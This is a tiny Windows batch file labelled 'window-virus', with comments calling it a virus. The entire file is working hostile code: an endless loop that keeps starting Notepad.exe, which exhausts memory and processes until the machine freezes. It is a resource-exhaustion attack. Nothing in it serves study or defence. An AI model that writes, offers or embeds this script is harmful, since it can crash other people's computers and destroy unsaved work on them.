# window-virus
# It is a virus for windows using notepad to run any app in infinite loop
@echo off
 :LoopStart
    start Notepad.exe
    goto LoopStart
    
